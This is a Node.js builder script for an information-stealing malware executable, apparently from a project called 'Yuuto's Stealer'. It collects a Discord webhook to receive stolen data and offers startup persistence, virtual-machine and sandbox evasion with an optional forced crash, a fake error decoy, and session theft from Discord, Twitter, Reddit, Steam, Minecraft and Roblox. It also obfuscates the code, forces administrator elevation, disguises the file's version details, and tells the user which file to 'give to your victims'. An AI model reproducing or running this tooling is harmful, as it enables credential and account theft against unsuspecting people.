const { rmSync, existsSync, writeFileSync, unlinkSync, readFileSync } = require('fs');
const { join, extname, resolve } = require('path');
const { execSync } = require('child_process');

if (!existsSync('node_modules')) {
  console.log('Installing npm modules... Please wait');
  const isYarnInstalled = existsSync(join(process.env.APPDATA, 'npm', 'yarn.cmd'));
  execSync(`${isYarnInstalled ? 'yarn' : 'npm'} install`, { stdio: 'inherit' });
  console.log('Installed npm modules\n');
}

const pngToIco = require('png-to-ico');
const inquirer = require('inquirer');
const config = require('./config.json');
const { load: loadRE } = require('resedit/cjs');
const { load: loadPE } = require('pe-library/cjs');
let icon;

console.log('========================================================');
console.log('|                                                      |');
console.log('|                Yuuto\'s Stealer Builder               |');
console.log('|       https://github.com/JustYuuto/Yuuto-Stealer     |');
console.log('|                                                      |');
console.log('========================================================');
console.log('');

(async () => {
  const answers = await inquirer
    .prompt([
      {
        name: 'app_name',
        type: 'input',
        message: 'How should we name the application? (Not the executable name!)',
        default: config.name,
        validate(input) {
          const done = this.async();
          if (input && input.trim() !== '') {
            done(null, true);
          } else {
            done('Name is not valid!');
          }
        }
      },
      {
        name: 'exe_name',
        type: 'input',
        message: 'How should we name the executable name? (the .exe file)',
        default: config.filename,
        validate(input) {
          const done = this.async();
          if (input && input.trim() !== '') {
            done(null, true);
          } else {
            done('Name is not valid!');
          }
        }
      },
      {
        name: 'webhook_url',
        type: 'input',
        message: 'Enter your webhook URL:',
        default: config.webhook && config.webhook.url,
        validate(input) {
          const done = this.async();
          if (input && /https:\/\/(canary\.|ptb\.)?discord\.com\/api\/webhooks\/[0-9]{17,19}\/([a-zA-Z0-9-_]+)/g.test(input)) {
            done(null, true);
          } else {
            done('Webhook URL is not valid!');
          }
        }
      },
      {
        name: 'options__add_to_startup',
        type: 'confirm',
        default: config.addToStartup,
        message: 'Add to startup programs?'
      },
      {
        name: 'options__anti_vm',
        type: 'confirm',
        default: config.vmProtect,
        message: 'Protect against Virtual Machines and sandboxes?'
      },
      {
        name: 'options__bsod_if_vm',
        type: 'confirm',
        default: config.bsodIfVm,
        when: (answers) => answers['options__anti_vm'] === true,
        message: 'If a Virtual Machine or a sandbox is detected, should the stealer create a BSOD on the computer?'
      },
      {
        name: 'options__fake_error',
        type: 'confirm',
        default: config.fakeError,
        message: 'Show a fake error to the user?'
      },
      {
        name: 'options__fake_error_customization',
        type: 'confirm',
        default: false,
        when: (answers) => answers['options__fake_error'] === true,
        message: 'Do you want to set a custom title or message for the error?'
      },
      {
        name: 'options__fake_error_title',
        type: 'string',
        when: (answers) => answers['options__fake_error_customization'] === true,
        default: config.fakeErrorDetails.title,
        message: 'Error title:'
      },
      {
        name: 'options__fake_error_message',
        type: 'string',
        when: (answers) => answers['options__fake_error_customization'] === true,
        default: config.fakeErrorDetails.message,
        message: 'Error message:'
      },
      {
        name: 'options__session_stealing',
        type: 'checkbox',
        message: 'Steal sessions from...',
        choices: [
          { name: 'Discord', value: 'discord', checked: config.sessionStealing.discord },
          { name: 'Twitter', value: 'twitter', checked: config.sessionStealing.twitter },
          { name: 'Reddit', value: 'reddit', checked: config.sessionStealing.reddit },
          { name: 'Steam', value: 'steam', checked: config.sessionStealing.steam },
          { name: 'Minecraft', value: 'minecraft', checked: config.sessionStealing.minecraft },
          { name: 'Roblox', value: 'roblox', checked: config.sessionStealing.roblox },
        ]
      },
      {
        name: 'custom_icon',
        type: 'confirm',
        message: 'Do you want to set a custom icon?',
      },
      {
        id: 'custom_icon_path',
        type: 'input',
        name: 'Enter your icon path',
        loop: true,
        when: (answers) => answers['custom_icon'] === true,
        validate(input) {
          const done = this.async();
          if (existsSync(input)) {
            if (extname(input) === '.png') {
              pngToIco(input)
                .then(ico => {
                  writeFileSync(resolve('icon.ico'), ico);
                  icon = input;
                  done(null, true);
                }).catch(e => {
                  done(`${e.message} Please check that your file is not damaged, corrupted, and is readable.`);
                });
            } else if (extname(input) === '.ico') {
              icon = input;
              done(null, true);
            } else {
              done('The icon must be a .ico or .png file!');
            }
          } else {
            done('The file doesn\'t exists!');
          }
        }
      }
    ]);
  config.name = answers.app_name;
  config.filename = answers.exe_name;
  config.webhook.url = answers.webhook_url;
  config.addToStartup = answers.options__add_to_startup;
  config.vmProtect = answers.options__anti_vm;
  config.bsodIfVm = typeof answers.options__bsod_if_vm === 'undefined' ? config.bsodIfVm : answers.options__bsod_if_vm;
  config.fakeError = answers.options__fake_error;
  config.fakeErrorDetails.title = answers.options__fake_error_title || config.fakeErrorDetails.title;
  config.fakeErrorDetails.message = answers.options__fake_error_message || config.fakeErrorDetails.message;
  config.sessionStealing = {};
  answers.options__session_stealing.forEach(i => config.sessionStealing[i] = true);
  writeFileSync('./config.json', JSON.stringify(config));

  console.log('\nStarting building process...');

  if (existsSync(join(__dirname, 'dist'))) {
    await rmSync(join(__dirname, 'dist'), { recursive: true });
  }

  if (existsSync(`${config.filename}.exe`)) unlinkSync(`${config.filename}.exe`);

  console.log('Minifying and obfuscating code... This can take some minutes, please be patient.');
  execSync('npx webpack', { stdio: 'pipe' });
  console.log('Done minifying and obfuscating.');

  await new Promise((r) => r(execSync(
    `npm install sqlite3 @primno/dpapi node-hide-console-window --omit=dev --no-package-lock --no-interactive --prefix "${join(__dirname, 'dist')}"`, { stdio: 'pipe' }
  )));

  console.log('Building executable...');

  new Promise((r) => r(execSync(`npx pkg . -C Brotli -o "${config.filename}.exe"`, { stdio: 'inherit' }))).then(async () => {
    const file = readFileSync(`${config.filename}.exe`);
    const PE = await loadPE();
    const RE = await loadRE();
    const exe = PE.NtExecutable.from(file);
    const res = PE.NtExecutableResource.from(exe);

    const rsrc = exe.getAllSections().find(section => section.info.name === '.rsrc').data;
    const enc = new TextDecoder('utf-8');
    const patched = enc.decode(rsrc).replace('level="asInvoker"', 'level="requireAdministrator"');
    exe.getAllSections().find(section => section.info.name === '.rsrc').data = patched;

    const versionInfo = RE.Resource.VersionInfo.fromEntries(res.entries)[0];

    versionInfo.setProductVersion(Math.floor(Math.random() * 9), Math.floor(Math.random() * 9), Math.floor(Math.random() * 9), 0, 1033);
    versionInfo.setFileVersion(Math.floor(Math.random() * 9), Math.floor(Math.random() * 9), Math.floor(Math.random() * 9), 0, 1033);
    versionInfo.setStringValues({ lang: 1033, codepage: 1200 }, {
      OriginalFilename: '',
      ProductName: `${config.name}`,
      LegalCopyright: `Copyright © ${new Date().getFullYear()} ${config.name}`,
      InternalFilename: `${config.filename}`,
      CompanyName: `${config.name}`,
      FileDescription: '',
    });
    versionInfo.removeStringValue({ lang: 1033, codepage: 1200 }, 'InternalName');
    versionInfo.outputToResourceEntries(res.entries);

    res.outputResource(exe);
    writeFileSync(`${config.filename}.exe`, Buffer.from(exe.generate()));

    rmSync(resolve('dist'), { recursive: true, force: true });

    console.log(`Done! The file you'll need to give to your victims is ${config.filename}.exe`);
  });
})();
